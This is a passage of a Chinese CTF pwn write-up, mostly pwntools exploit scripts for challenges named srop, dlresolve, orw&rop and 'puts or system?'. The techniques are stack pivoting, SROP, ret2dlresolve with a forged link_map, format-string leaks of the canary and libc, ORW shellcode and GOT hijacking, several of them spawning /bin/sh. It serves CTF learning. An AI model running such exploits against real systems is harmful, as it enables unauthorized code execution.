line="y9G8" data-language="python" class="ql-code-block ql-word-wrap-true">system = libc.sym[<span class="hljs-string">"system"</span>]</div><div line="7KCF" data-language="python" class="ql-code-block ql-word-wrap-true">binsh = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b"/bin/sh"</span>))</div><div line="Emre" data-language="python" class="ql-code-block ql-word-wrap-true">success(<span class="hljs-string">"libc.address--&gt;"</span> + <span class="hljs-built_in">hex</span>(libc.address))</div><div line="3W08" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="gm96" data-language="python" class="ql-code-block ql-word-wrap-true">p.recvuntil(<span class="hljs-string">"just chat with me:\n"</span>)</div><div line="2Eb0" data-language="python" class="ql-code-block ql-word-wrap-true">pay = p64(pop_rdi_ret) + p64(binsh) + p64(system)</div><div line="BlcY" data-language="python" class="ql-code-block ql-word-wrap-true">pay = pay.ljust(<span class="hljs-number">0x50</span>, <span class="hljs-string">b'\x00'</span>) + p64(bss + <span class="hljs-number">0x100</span> - <span class="hljs-number">0x8</span>) + p64(leave_ret)</div><div line="Rk9T" data-language="python" class="ql-code-block ql-word-wrap-true">p.send(pay)</div><div line="OJxq" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="eaJV" data-language="python" class="ql-code-block ql-word-wrap-true">p.interactive()</div></div><p ql-global="true" line="un5f">或者可以复用函数里的puts，控制rdi后，再跳转到函数里的call puts，然后溢出打rop</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="zxCl" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</div><div line="6HCA" data-language="python" class="ql-code-block ql-word-wrap-true">context.update(os = <span class="hljs-string">'linux'</span>,arch = <span class="hljs-string">'amd64'</span>)</div><div line="kzgy" data-language="python" class="ql-code-block ql-word-wrap-true">context.log_level = <span class="hljs-string">'debug'</span></div><div line="Jrk6" data-language="python" class="ql-code-block ql-word-wrap-true">binary = <span class="hljs-string">'./revenge'</span></div><div line="IM69" data-language="python" class="ql-code-block ql-word-wrap-true">elf = ELF(binary)</div><div line="RBFA" data-language="python" class="ql-code-block ql-word-wrap-true">libc = ELF(<span class="hljs-string">'./libc.so.6'</span>)</div><div line="MrsV" data-language="python" class="ql-code-block ql-word-wrap-true">DEBUG = <span class="hljs-number">1</span></div><div line="DNiB" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">if</span> DEBUG:</div><div line="3JJ6" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; libc = elf.libc</div><div line="J9Ce" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; p = process(binary)</div><div line="yYjU" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">else</span>:</div><div line="wrUl" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; host = <span class="hljs-string">'127.0.0.1'</span></div><div line="76R3" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; port = <span class="hljs-string">'1145'</span></div><div line="ZcBP" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; p = remote(host,port)</div><div line="siPW" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="wzsT" data-language="python" class="ql-code-block ql-word-wrap-true">bss = elf.bss(<span class="hljs-number">0x700</span>)</div><div line="Ast5" data-language="python" class="ql-code-block ql-word-wrap-true">pop_rdi_ret = <span class="hljs-number">0x00000000004012b3</span></div><div line="HG2z" data-language="python" class="ql-code-block ql-word-wrap-true">pop_rbp_ret = <span class="hljs-number">0x000000000040115d</span></div><div line="HZwL" data-language="python" class="ql-code-block ql-word-wrap-true">leave_ret = <span class="hljs-number">0x0000000000401227</span></div><div line="tPm4" data-language="python" class="ql-code-block ql-word-wrap-true">ret = <span class="hljs-number">0x000000000040101a</span></div><div line="aS5l" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="Zoif" data-language="python" class="ql-code-block ql-word-wrap-true">p.recvuntil(<span class="hljs-string">"just chat with me:\n"</span>)</div><div line="sQyN" data-language="python" class="ql-code-block ql-word-wrap-true">pay = <span class="hljs-string">b'a'</span>*<span class="hljs-number">0x50</span> + p64(bss + <span class="hljs-number">0x50</span>) + p64(<span class="hljs-number">0x4011F3</span>)</div><div line="gBA0" data-language="python" class="ql-code-block ql-word-wrap-true">p.send(pay)</div><div line="WBML" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="5629" data-language="python" class="ql-code-block ql-word-wrap-true">p.recvuntil(<span class="hljs-string">"just chat with me:\n"</span>)</div><div line="xaDs" data-language="python" class="ql-code-block ql-word-wrap-true">pay = p64(pop_rdi_ret) + p64(elf.got[<span class="hljs-string">"puts"</span>]) </div><div line="fKsn" data-language="python" class="ql-code-block ql-word-wrap-true">pay += p64(pop_rbp_ret) + p64(bss + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x50</span>) + p64(<span class="hljs-number">0x4011FA</span>)</div><div line="Wg2T" data-language="python" class="ql-code-block ql-word-wrap-true">pay = pay.ljust(<span class="hljs-number">0x50</span>, <span class="hljs-string">b'\x00'</span>) + p64(bss - <span class="hljs-number">0x8</span>) + p64(leave_ret)</div><div line="pnlz" data-language="python" class="ql-code-block ql-word-wrap-true">p.send(pay)</div><div line="3J8R" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="TIuG" data-language="python" class="ql-code-block ql-word-wrap-true">libc.address = u64(p.recvuntil(<span class="hljs-string">b'\x7f'</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b'\x00'</span>)) - libc.sym[<span class="hljs-string">"puts"</span>]</div><div line="QecW" data-language="python" class="ql-code-block ql-word-wrap-true">system = libc.sym[<span class="hljs-string">"system"</span>]</div><div line="8vMp" data-language="python" class="ql-code-block ql-word-wrap-true">binsh = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b"/bin/sh"</span>))</div><div line="g8aX" data-language="python" class="ql-code-block ql-word-wrap-true">success(<span class="hljs-string">"libc.address--&gt;"</span> + <span class="hljs-built_in">hex</span>(libc.address))</div><div line="90Bj" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="uwxL" data-language="python" class="ql-code-block ql-word-wrap-true">pay = p64(pop_rdi_ret) + p64(binsh) + p64(system)</div><div line="oNHG" data-language="python" class="ql-code-block ql-word-wrap-true">pay = pay.ljust(<span class="hljs-number">0x50</span>, <span class="hljs-string">b'\x00'</span>) + p64(bss + <span class="hljs-number">0x100</span> - <span class="hljs-number">0x8</span>) + p64(leave_ret)</div><div line="cXiz" data-language="python" class="ql-code-block ql-word-wrap-true">p.send(pay)</div><div line="CwJ6" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="1ejv" data-language="python" class="ql-code-block ql-word-wrap-true">p.interactive()</div></div><p ql-global="true" line="0Kia"><br></p><p ql-global="true" line="iIac"><br></p><h1><div ql-global="true" line="3ass" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>srop</div></h1><ul data-list-style="circle"><li ql-global="true" line="9HDY" class="bullet-item"><strong>考点</strong>：srop+移栈</li></ul><ul data-list-style="circle"><li ql-global="true" line="j6rx" class="bullet-item"><strong>FLAG</strong>：动态FLAG</li></ul><ul data-list-style="circle"><li ql-global="true" line="8wEz" class="bullet-item"><strong>解题步骤</strong></li></ul><ol data-list-style="decimal"><li ql-global="true" line="ToSS" data-list-number="1" data-list-content="1." class="ordered-item">移栈构造所需字符串</li></ol><ol data-list-style="decimal"><li ql-global="true" line="AZQk" data-list-number="2" data-list-content="2." class="ordered-item">进行srop，调用execve。</li></ol><div class="ql-code-block-container" data-language="plain" spellcheck="false"><div line="IhST" data-language="plain" class="ql-code-block">from pwn import *</div><div line="fgMb" data-language="plain" class="ql-code-block"><br></div><div line="bJb2" data-language="plain" class="ql-code-block">context.arch='amd64'</div><div line="1G0h" data-language="plain" class="ql-code-block">context.os='linux'</div><div line="WKX8" data-language="plain" class="ql-code-block">context.log_level='debug'</div><div line="lyn3" data-language="plain" class="ql-code-block"><br></div><div line="QyHu" data-language="plain" class="ql-code-block">choice=1</div><div line="L5fI" data-language="plain" class="ql-code-block">if choice==1:</div><div line="8lHY" data-language="plain" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp; p=process('./pwn')</div><div line="eNsM" data-language="plain" class="ql-code-block">else:</div><div line="DexT" data-language="plain" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp; p=remote("", )</div><div line="jse6" data-language="plain" class="ql-code-block"><br></div><div line="KlLc" data-language="plain" class="ql-code-block">s &nbsp; &nbsp; &nbsp; = lambda data &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; :p.send(data)</div><div line="bpzL" data-language="plain" class="ql-code-block">sl &nbsp; &nbsp; &nbsp;= lambda data &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; :p.sendline(data)</div><div line="9mJL" data-language="plain" class="ql-code-block">sa &nbsp; &nbsp; &nbsp;= lambda x,data &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; :p.sendafter(x, data)</div><div line="A0FF" data-language="plain" class="ql-code-block">sla &nbsp; &nbsp; = lambda x,data &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; :p.sendlineafter(x, data)</div><div line="9Dhj" data-language="plain" class="ql-code-block">r &nbsp; &nbsp; &nbsp; = lambda num=4096 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; :p.recv(num)</div><div line="pAvk" data-language="plain" class="ql-code-block">rl &nbsp; &nbsp; &nbsp;= lambda num=4096 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; :p.recvline(num)</div><div line="LsLf" data-language="plain" class="ql-code-block">ru &nbsp; &nbsp; &nbsp;= lambda x &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;:p.recvuntil(x)</div><div line="GkFj" data-language="plain" class="ql-code-block"><br></div><div line="bqPK" data-language="plain" class="ql-code-block">def debug(cmd=''):</div><div line="ZRB8" data-language="plain" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp; gdb.attach(p,cmd)</div><div line="bRdg" data-language="plain" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp; pause()</div><div line="I7yO" data-language="plain" class="ql-code-block"><br></div><div line="5FIm" data-language="plain" class="ql-code-block">elf=ELF('./pwn')</div><div line="D8OF" data-language="plain" class="ql-code-block"><br></div><div line="wjcL" data-language="plain" class="ql-code-block">rdi=0x0000000000401203</div><div line="Axw9" data-language="plain" class="ql-code-block">syscall=elf.plt['syscall']</div><div line="PCr7" data-language="plain" class="ql-code-block">lea=0x401171</div><div line="Xt83" data-language="plain" class="ql-code-block">bss=0x404050+0x300</div><div line="LRwF" data-language="plain" class="ql-code-block"><br></div><div line="Ee9J" data-language="plain" class="ql-code-block">ru('welcome to srop!\n')</div><div line="KfAD" data-language="plain" class="ql-code-block">frame=SigreturnFrame()</div><div line="3RGi" data-language="plain" class="ql-code-block">frame.rdi=59</div><div line="ugJh" data-language="plain" class="ql-code-block">frame.rsi=bss-0x30</div><div line="p1WL" data-language="plain" class="ql-code-block">frame.rdx=0</div><div line="PSSF" data-language="plain" class="ql-code-block">frame.rcx=0</div><div line="7RAK" data-language="plain" class="ql-code-block">frame.rsp=bss+0x38</div><div line="YpUl" data-language="plain" class="ql-code-block">frame.rip=syscall</div><div line="65sv" data-language="plain" class="ql-code-block"><br></div><div line="mdVU" data-language="plain" class="ql-code-block"><br></div><div line="6bET" data-language="plain" class="ql-code-block">s(b'a'*0x30+flat(bss,lea))</div><div line="6Qlp" data-language="plain" class="ql-code-block">#debug()</div><div line="BzE1" data-language="plain" class="ql-code-block">s(b'/bin/sh\x00'+b'a'*0x30+flat(rdi,0xf,syscall,frame))</div><div line="0woU" data-language="plain" class="ql-code-block"><br></div><div line="uHir" data-language="plain" class="ql-code-block">p.interactive()</div></div><h1><div ql-global="true" line="TIun" style="line-height: 2.0;" linespacing="115" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>dlresolve</div></h1><ul data-list-style="circle"><li ql-global="true" line="YJqy" class="bullet-item"><strong>考点</strong>：ret2dlresolve</li></ul><ul data-list-style="circle"><li ql-global="true" line="4G2c" class="bullet-item"><strong>FLAG</strong>：动态FLAG</li></ul><ul data-list-style="circle"><li ql-global="true" line="0p42" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="HZg2"><span style="color: rgb(51, 51, 51);" class="ql-size-12">虽然比赛里很少用到ret2dlresolve，但是通过对这种方法的学习，有助于加深对结构体的理解，对后续学习还是很有好处的。这里用的是这位</span><a class="ql-size-12 ql-link" href="https://shimo.im/docs/QPMRxzGktzsZnzhz/%5Bret2dlresolve%E8%B6%85%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B(x86&amp;x64)-CSDN%E5%8D%9A%E5%AE%A2%5D(https://blog.csdn.net/qq_51868336/article/details/114644569)?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgxNTMxMTIsImZpbGVHVUlEIjoiUVBNUnh6R2t0enNabnpoeiIsImlhdCI6MTY5ODE1MjgxMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMzMzU1NDY5MH0.DCaFYw7V0Y72gh5281Lf_LZXMwp5i0HBVhaQ3_UA3rU" target="_blank" rel="noopener noreferrer nofollow" style="color: rgb(65, 131, 196);">师傅</a><span style="color: rgb(51, 51, 51);" class="ql-size-12">的模板，跟着他的文章来，基本就能学会了。</span></p><p ql-global="true" line="TWTr"><br></p><p ql-global="true" line="8j1U"><span style="color: rgb(51, 51, 51);" class="ql-size-12">1.伪造 link_map-&gt;l_addr 为libc中已解析函数与想要执行的目标函数的偏移值，如 addr_system-addr_xxx</span></p><p ql-global="true" line="DwfZ"><span style="color: rgb(51, 51, 51);" class="ql-size-12">2.伪造 sym-&gt;st_value 为已经解析过的某个函数的 got 表的位置</span></p><p ql-global="true" line="4f29"><span style="color: rgb(51, 51, 51);" class="ql-size-12">3.也就是相当于 value = l_addr + st_value = addr_system - addr_xxx + real_xxx = real_system</span></p><div class="ql-code-block-container" data-language="python" spellcheck="false"><div line="bxH2" data-language="python" class="ql-code-block"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</div><div line="Vc2B" data-language="python" class="ql-code-block"><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *</div><div line="xC2a" data-language="python" class="ql-code-block">context(os = <span class="hljs-string">"linux"</span>, arch = <span class="hljs-string">"amd64"</span>, log_level= <span class="hljs-string">"debug"</span>)</div><div line="81QD" data-language="python" class="ql-code-block"><br></div><div line="rJkJ" data-language="python" class="ql-code-block">p=process(<span class="hljs-string">'./pwn'</span>)</div><div line="wfhz" data-language="python" class="ql-code-block"><br></div><div line="P0QE" data-language="python" class="ql-code-block">elf = ELF(<span class="hljs-string">'./pwn'</span>)&nbsp;&nbsp;</div><div line="ToRI" data-language="python" class="ql-code-block">libc = ELF(<span class="hljs-string">'./libc-2.31.so'</span>)&nbsp;&nbsp;</div><div line="3kUC" data-language="python" class="ql-code-block">read_plt = elf.plt[<span class="hljs-string">'read'</span>]&nbsp;&nbsp;</div><div line="JcM3" data-language="python" class="ql-code-block">read_got = elf.got[<span class="hljs-string">'read'</span>]&nbsp;&nbsp;</div><div line="4J8V" data-language="python" class="ql-code-block">vuln_addr = elf.sym[<span class="hljs-string">'main'</span>]&nbsp;&nbsp;</div><div line="cSpt" data-language="python" class="ql-code-block">plt0 = <span class="hljs-number">0x401020</span> <span class="hljs-comment">#plt段地址&nbsp;</span></div><div line="SprV" data-language="python" class="ql-code-block">bss = <span class="hljs-number">0x404040</span>&nbsp;&nbsp;</div><div line="YqJz" data-language="python" class="ql-code-block">bss_stage = bss + <span class="hljs-number">0x100</span></div><div line="25WY" data-language="python" class="ql-code-block">l_addr =&nbsp; libc.sym[<span class="hljs-string">'system'</span>] -libc.sym[<span class="hljs-string">'read'</span>]&nbsp;&nbsp;</div><div line="GU2S" data-language="python" class="ql-code-block">&nbsp;&nbsp;</div><div line="OqXj" data-language="python" class="ql-code-block">pop_rdi = <span class="hljs-number">0x000000000040115e</span>&nbsp; <span class="hljs-comment">#pop rdi ; ret</span></div><div line="DzlZ" data-language="python" class="ql-code-block">pop_rsi = <span class="hljs-number">0x000000000040116b</span>&nbsp; <span class="hljs-comment">#pop rsi ; ret</span></div><div line="8ETz" data-language="python" class="ql-code-block"><span class="hljs-comment">#用于解析符号dl_runtime_resolve&nbsp;&nbsp;</span></div><div line="PnEr" data-language="python" class="ql-code-block">plt_load =p64(plt0+<span class="hljs-number">6</span>)&nbsp;</div><div line="xH7X" data-language="python" class="ql-code-block"><br></div><div line="bzAr" data-language="python" class="ql-code-block"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fake_Linkmap_payload</span>(<span class="hljs-params">fake_linkmap_addr,known_func_ptr,offset</span>):</div><div line="fGxQ" data-language="python" class="ql-code-block">&nbsp; &nbsp; linkmap = p64(offset &amp; (<span class="hljs-number">2</span> ** <span class="hljs-number">64</span> - <span class="hljs-number">1</span>))<span class="hljs-comment">#l_addr</span></div><div line="UrZb" data-language="python" class="ql-code-block">&nbsp; &nbsp; linkmap += p64(<span class="hljs-number">0</span>)</div><div line="jFCy" data-language="python" class="ql-code-block">&nbsp; &nbsp; linkmap += p64(fake_linkmap_addr + <span class="hljs-number">0x18</span>)&nbsp;</div><div line="oxT1" data-language="python" class="ql-code-block">&nbsp; &nbsp; linkmap += p64((fake_linkmap_addr + <span class="hljs-number">0x30</span> - offset) &amp; (<span class="hljs-number">2</span> ** <span class="hljs-number">64</span> - <span class="hljs-number">1</span>))</div><div line="KYBM" data-language="python" class="ql-code-block">&nbsp; &nbsp; linkmap += p64(<span class="hljs-number">0x7</span>)</div><div line="VRWN" data-language="python" class="ql-code-block">&nbsp; &nbsp; linkmap += p64(<span class="hljs-number">0</span>)</div><div line="oPK8" data-language="python" class="ql-code-block">&nbsp; &nbsp; linkmap += p64(<span class="hljs-number">0</span>)</div><div line="cpPR" data-language="python" class="ql-code-block">&nbsp; &nbsp; linkmap += p64(<span class="hljs-number">0</span>)&nbsp;</div><div line="UQnx" data-language="python" class="ql-code-block">&nbsp; &nbsp; linkmap += p64(known_func_ptr - <span class="hljs-number">0x8</span>)&nbsp;</div><div line="7ijU" data-language="python" class="ql-code-block">&nbsp; &nbsp; linkmap += <span class="hljs-string">b'/bin/sh\x00'</span></div><div line="l9ye" data-language="python" class="ql-code-block">&nbsp; &nbsp; linkmap = linkmap.ljust(<span class="hljs-number">0x68</span>,<span class="hljs-string">b'A'</span>)</div><div line="UmAR" data-language="python" class="ql-code-block">&nbsp; &nbsp; linkmap += p64(fake_linkmap_addr)&nbsp;</div><div line="eEiS" data-language="python" class="ql-code-block">&nbsp; &nbsp; linkmap += p64(fake_linkmap_addr + <span class="hljs-number">0x38</span>)&nbsp;</div><div line="oTQ9" data-language="python" class="ql-code-block">&nbsp; &nbsp; linkmap = linkmap.ljust(<span class="hljs-number">0xf8</span>,<span class="hljs-string">b'A'</span>)</div><div line="hZfn" data-language="python" class="ql-code-block">&nbsp; &nbsp; linkmap += p64(fake_linkmap_addr + <span class="hljs-number">0x8</span>)</div><div line="cF0X" data-language="python" class="ql-code-block">&nbsp; &nbsp; <span class="hljs-keyword">return</span> linkmap</div><div line="Ek30" data-language="python" class="ql-code-block">&nbsp; &nbsp;&nbsp;</div><div line="jkOt" data-language="python" class="ql-code-block">fake_link_map = fake_Linkmap_payload(bss_stage, read_got ,l_addr)</div><div line="74mH" data-language="python" class="ql-code-block"><br></div><div line="aSs6" data-language="python" class="ql-code-block">payload = flat( <span class="hljs-string">'a'</span> * <span class="hljs-number">120</span> ,pop_rdi, <span class="hljs-number">0</span> , pop_rsi , bss_stage&nbsp; , read_plt , <span class="hljs-comment"># 把link_map写到bss段上</span></div><div line="233R" data-language="python" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop_rsi ,<span class="hljs-number">0</span> , <span class="hljs-comment"># 使栈十六字节对齐，不然调用不了system</span></div><div line="bxzX" data-language="python" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop_rdi , bss_stage + <span class="hljs-number">0x48</span>&nbsp; , plt_load , bss_stage , <span class="hljs-number">0</span> <span class="hljs-comment"># 把/bin/sh传进rdi，并且调用_dl_rutnime_resolve函数，传入伪造好的link_map和索引</span></div><div line="jIFM" data-language="python" class="ql-code-block">)</div><div line="Pf3R" data-language="python" class="ql-code-block"><br></div><div line="Tv8R" data-language="python" class="ql-code-block">p.sendline(payload)&nbsp;&nbsp;</div><div line="KVMX" data-language="python" class="ql-code-block">p.send(fake_link_map)&nbsp;</div><div line="aLXV" data-language="python" class="ql-code-block"><br></div><div line="L0YO" data-language="python" class="ql-code-block">p.interactive()</div></div><h1><div ql-global="true" line="HGdE" style="line-height: 2.0;" linespacing="115" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>orw&amp;rop</div></h1><ul data-list-style="circle"><li ql-global="true" line="zGyB" class="bullet-item"><strong>考点</strong>：orw shellcode</li></ul><ul data-list-style="circle"><li ql-global="true" line="cLBM" class="bullet-item"><strong>FLAG</strong>：动态FLAG</li></ul><ul data-list-style="circle"><li ql-global="true" line="7TkJ" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="mQK7">题目开启了sandbox，禁用了execve调用，也就无法使用system("/bin/sh")，考虑使用open，read，write函数即orw打印出flag的内容。分析题目可知，程序在0x66660000处分配了一块读写执行的内存空间，并且存在格式化字符串漏洞。考虑rop出一个read(0,0x66660000,0x100)向该地址读入数据，并控制返回到该地址执行。</p><p ql-global="true" line="u0Eo">主要漏洞在于格式化字符串，canary与libc都可以通过这一个漏洞泄露出来。泄露libc的目的在于程序可用的gadget很少，需要在libc中寻找用于rop的gadget。格式化字符串具体利用%s对应puts_got来泄露puts的真实地址，%p泄露canary。题目给了libc文件，gadget用ROPgadget找就行。rop出read后直接利用pwntools生成orw即可。</p><div class="ql-code-block-container" data-language="plain" word-wrap="" spellcheck="false"><div line="yLLE" data-language="plain" class="ql-code-block ql-word-wrap-true">from pwn import *</div><div line="fxf7" data-language="plain" class="ql-code-block ql-word-wrap-true">context(os="linux", arch="amd64", log_level="debug")</div><div line="CWU3" data-language="plain" class="ql-code-block ql-word-wrap-true"># p=process('./ezorw')</div><div line="q5yL" data-language="plain" class="ql-code-block ql-word-wrap-true">p=remote("node4.buuoj.cn",28491)</div><div line="nufR" data-language="plain" class="ql-code-block ql-word-wrap-true">elf = ELF('./ezorw')</div><div line="azqQ" data-language="plain" class="ql-code-block ql-word-wrap-true">libc &nbsp;= ELF('./libc.so.6')</div><div line="vkyH" data-language="plain" class="ql-code-block ql-word-wrap-true">puts_got=elf.got['puts']</div><div line="M2eM" data-language="plain" class="ql-code-block ql-word-wrap-true"><br></div><div line="SSfk" data-language="plain" class="ql-code-block ql-word-wrap-true">##leak libc canary</div><div line="8g7Q" data-language="plain" class="ql-code-block ql-word-wrap-true">payload=b'%8$s%11$p'+b'\x00'*7+p64(puts_got)</div><div line="LjZ2" data-language="plain" class="ql-code-block ql-word-wrap-true">p.sendafter("sandbox\n",payload)</div><div line="A6jD" data-language="plain" class="ql-code-block ql-word-wrap-true">puts_addr=u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))</div><div line="J7ai" data-language="plain" class="ql-code-block ql-word-wrap-true">print(hex(puts_addr))</div><div line="15ro" data-language="plain" class="ql-code-block ql-word-wrap-true">canary=int(p.recv()[2:18],16)</div><div line="1lh2" data-language="plain" class="ql-code-block ql-word-wrap-true">print(hex(canary))</div><div line="QDKj" data-language="plain" class="ql-code-block ql-word-wrap-true">libc_base = puts_addr - libc.symbols['puts']</div><div line="fONM" data-language="plain" class="ql-code-block ql-word-wrap-true"><br></div><div line="XVmk" data-language="plain" class="ql-code-block ql-word-wrap-true">##gadget</div><div line="oyfO" data-language="plain" class="ql-code-block ql-word-wrap-true">ret &nbsp; &nbsp; &nbsp; = 0x2a264 + libc_base</div><div line="ejAL" data-language="plain" class="ql-code-block ql-word-wrap-true">pop_rdi &nbsp; = 0x2a3e5 + libc_base</div><div line="70Y6" data-language="plain" class="ql-code-block ql-word-wrap-true">pop_rsi &nbsp; = 0x2be51 + libc_base</div><div line="AozG" data-language="plain" class="ql-code-block ql-word-wrap-true">pop_rdx &nbsp; = 0x90529 + libc_base #pop rdx pop rbx ret</div><div line="LYwE" data-language="plain" class="ql-code-block ql-word-wrap-true">pop_rax &nbsp; = 0x45eb0 + libc_base</div><div line="gbNh" data-language="plain" class="ql-code-block ql-word-wrap-true">read_addr = libc_base + libc.sym['read']</div><div line="1XeP" data-language="plain" class="ql-code-block ql-word-wrap-true"><br></div><div line="Ia04" data-language="plain" class="ql-code-block ql-word-wrap-true">##栈溢出</div><div line="wC7q" data-language="plain" class="ql-code-block ql-word-wrap-true">payload2 &nbsp;= b'a'*40+p64(canary)+b'a'*8</div><div line="ZKLG" data-language="plain" class="ql-code-block ql-word-wrap-true">##read(0,0x66660000,0x100)</div><div line="ECsU" data-language="plain" class="ql-code-block ql-word-wrap-true">payload2 += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(0x66660000) + p64(pop_rdx) + p64(0x100) + p64(0) + p64(read_addr)</div><div line="wqqr" data-language="plain" class="ql-code-block ql-word-wrap-true">##ret</div><div line="cEfx" data-language="plain" class="ql-code-block ql-word-wrap-true">payload2 += p64(0x66660000)+p64(ret)</div><div line="6oll" data-language="plain" class="ql-code-block ql-word-wrap-true">p.send(payload2)</div><div line="bFP5" data-language="plain" class="ql-code-block ql-word-wrap-true"><br></div><div line="2Q4d" data-language="plain" class="ql-code-block ql-word-wrap-true">##orw</div><div line="Lkka" data-language="plain" class="ql-code-block ql-word-wrap-true">pause()</div><div line="XwwL" data-language="plain" class="ql-code-block ql-word-wrap-true">orw_shellcode &nbsp;= shellcraft.open('./flag')</div><div line="kN08" data-language="plain" class="ql-code-block ql-word-wrap-true">orw_shellcode += shellcraft.read(3,0x66660200,0x100)</div><div line="7WOI" data-language="plain" class="ql-code-block ql-word-wrap-true">orw_shellcode += shellcraft.write(1,0x66660200,0x100)</div><div line="MG5E" data-language="plain" class="ql-code-block ql-word-wrap-true">p.send(asm(orw_shellcode))</div><div line="8otj" data-language="plain" class="ql-code-block ql-word-wrap-true">p.interactive()</div></div><h1><div ql-global="true" line="lfMT" style="line-height: 2.0;" linespacing="115" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>puts or system?</div></h1><ul data-list-style="circle"><li ql-global="true" line="MejA" class="bullet-item"><strong>考点</strong>：hijack got</li></ul><ul data-list-style="circle"><li ql-global="true" line="0MOM" class="bullet-item"><strong>FLAG</strong>：动态FLAG</li></ul><ul data-list-style="circle"><li ql-global="true" line="9Hjo" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="rPwe"><strong>  </strong>依旧是对格式化字符串利用的考察，由于题目没有开启full reload，可以修改puts_got变为system的地址，在调用puts("/bin/sh")时会变成system("/bin/sh")从而getshell。</p><p ql-global="true" line="sNmh">具体利用方法同上，%s泄露出libc，在libc中找到system的地址，调用fmtstr_payload就可以</p><div class="ql-code-block-container" data-language="plain" word-wrap="" spellcheck="false"><div line="TChj" data-language="plain" class="ql-code-block ql-word-wrap-true">from pwn import *</div><div line="BrEg" data-language="plain" class="ql-code-block ql-word-wrap-true"><br></div><div line="144Q" data-language="plain" class="ql-code-block ql-word-wrap-true">context(arch='amd64', os='linux', log_level='debug')</div><div line="kdyG" data-language="plain" class="ql-code-block ql-word-wrap-true"># p = process('./putsorsys')</div><div line="ODBc" data-language="plain" class="ql-code-block ql-word-wrap-true">p=remote("node4.buuoj.cn",27817)</div><div line="PyCs" data-language="plain" class="ql-code-block ql-word-wrap-true">elf &nbsp;= ELF('putsorsys')</div><div line="2ZYd" data-language="plain" class="ql-code-block ql-word-wrap-true">libc = ELF('libc.so.6')</div><div line="A9d2" data-language="plain" class="ql-code-block ql-word-wrap-true"><br></div><div line="PctQ" data-language="plain" class="ql-code-block ql-word-wrap-true">puts_got = elf.got['puts']</div><div line="U1cw" data-language="plain" class="ql-code-block ql-word-wrap-true"><br></div><div line="zxIT" data-language="plain" class="ql-code-block ql-word-wrap-true">offset = 8</div><div line="ylJA" data-language="plain" class="ql-code-block ql-word-wrap-true">p.sendlineafter("(0/1)\n", '1')</div><div line="zbeR" data-language="plain" class="ql-code-block ql-word-wrap-true">payload = b'a' * 4 + b'%9$s' + p64(puts_got)</div><div line="HJx8" data-language="plain" class="ql-code-block ql-word-wrap-true">p.send(payload)</div><div line="lknF" data-language="plain" class="ql-code-block ql-word-wrap-true">p.recvuntil('aaaa')</div><div line="8LHp" data-language="plain" class="ql-code-block ql-word-wrap-true">puts_addr = u64(p.recv(6).ljust(8,b"\x00"))</div><div line="LJSq" data-language="plain" class="ql-code-block ql-word-wrap-true"><br></div><div line="enKD" data-language="plain" class="ql-code-block ql-word-wrap-true">print(hex(puts_addr))</div><div line="INqh" data-language="plain" class="ql-code-block ql-word-wrap-true">libc_base = puts_addr - libc.symbols['puts'] </div><div line="5HVX" data-language="plain" 